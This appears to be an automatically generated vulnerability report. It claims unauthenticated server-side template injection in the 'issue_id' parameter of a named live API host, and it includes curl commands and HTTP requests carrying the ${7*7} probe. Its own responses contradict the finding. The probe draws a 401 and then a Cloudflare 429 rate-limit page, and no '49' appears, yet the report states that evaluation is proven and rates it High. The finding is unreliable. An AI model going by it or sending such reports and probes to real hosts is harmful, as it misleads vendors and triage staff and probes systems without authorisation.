# Server-side template injection in 'issue_id'

**Severity:** High — The server evaluated an injected expression; command execution was not attempted, so this is not graded Critical.

**OWASP:** A03:2021 Injection

## Summary

Input to this parameter is executed as a template expression on the server.

## Affected Component

- **Endpoint:** `https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1`
- **Method:** `GET`
- **Parameter / field:** `issue_id`
- **Host:** `api-i1.fyers.in`
- **Authentication required:** No — reproduced unauthenticated

## Steps to Reproduce

1. baseline, unmodified request:
   ```
   curl -i -s -X GET 'https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1'
   ```
   Server returns `401` — baseline, unmodified request.
2. template expression injected into 'issue_id':
   ```
   curl -i -s -X GET 'https://api-i1.fyers.in/invest/admin/v1/sgb/issue-list?is_active=1&issue_id=$%7B7%2A7%7D&source=1'
   ```
   Server returns `429` — template expression injected into 'issue_id'.

## Proof of Concept

**Request 1** — baseline, unmodified request

```http
GET /invest/admin/v1/sgb/issue-list?is_active=1&issue_id=1&source=1 HTTP/1.1
Host: TARGET_HOST
User-Agent: SmartHunt/1.0 (+recon)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: ATTACKER_SESSION
```

**Response 1**

```http
HTTP/1.1 401
Date: Thu, 06 Aug 2026 05:34:39 GMT
Content-Type: application/json
Content-Length: 92
Connection: keep-alive
X-Content-Type-Options: nosniff
server: cloudflare
cf-cache-status: DYNAMIC
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
CF-RAY: a26bac751cc50995-SJC

{"s":"error","error_code":-27,"status_code":401,"message":"Could not authenticate the user"}
```

**Request 2** — template expression injected into 'issue_id'

```http
GET /invest/admin/v1/sgb/issue-list?is_active=1&issue_id=$%7B7%2A7%7D&source=1 HTTP/1.1
Host: TARGET_HOST
User-Agent: SmartHunt/1.0 (+recon)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Cookie: ATTACKER_SESSION
```

**Response 2**

```http
HTTP/1.1 429
Date: Thu, 06 Aug 2026 05:34:39 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Retry-After: 0
Cache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Expires: Thu, 01 Jan 1970 00:00:01 GMT
Referrer-Policy: same-origin
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
Server: cloudflare
CF-RAY: a26bac7b183d0995-SJC

<!doctype html>
<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="en-US"> <![endif]-->
<!--[if IE 7]>    <html class="no-js ie7 oldie" lang="en-US"> <![endif]-->
<!--[if IE 8]>    <html class="no-js ie8 oldie" lang="en-US"> <![endif]-->
<!--[if gt IE 8]><!-->
<html class="no-js" lang="en-US">
    <!--<![endif]-->
    <head>
        <title>Access denied | TARGET_HOST used Cloudflare to restrict access | TARGET_HOST | Cloudflare</title>
        <meta charset="UTF-8" />
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta http-equiv="X-UA-Compatible" content="IE=Edge" />
<meta name="robots" content="noindex, nofollow" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<link rel="stylesheet" id="cf_styles-css" href="/cdn-cgi/styles/main.css" /> <script>
  (function(){if(document.addEventListener&&window.XMLHttpRequest&&JSON&&JSON.stringify){var e=function(a){var c=document.getElementById("error-feedback-survey"),d=document.getElementById("error-feedback-success"),b=new XMLHttpRequest;a={event:"feedback clicked",properties:{errorCode: 1015 },helpful:a,version: 1 };b.open("POST","https://sparrow.cloudflare.com/api/v1/event");b.setRequestHeader("Content-Type","application/json");b.setRequestHeader("Sparrow-Source-Key","c771f0e4b54944bebf4261d44bd79a1e");
b.send(JSON.stringify(a));c.classList.add("feedback-hidden");d.classList.re
… [2800 more bytes]
```

## Impact

- **Proven:** Input to this parameter is executed as a template expression on the server.
- **Security boundary crossed:** Untrusted input is evaluated by the server-side template engine

## Expected vs Actual

- **Expected:** ${7*7} is rendered literally as text
- **Actual:** The server evaluated the expression and returned 49

## Reproduction Reliability

Reproduced 3× total, unauthenticated.

## Remediation

- Never pass user input into template source; pass it as context data
- Use a sandboxed/logic-less template engine where possible
- Validate against an allow-list when a template must be selected by input

---

Selected from 261 scan finding(s); 177 were informational or hardening-only and are not reportable on their own. Credentials and personal data above are masked.
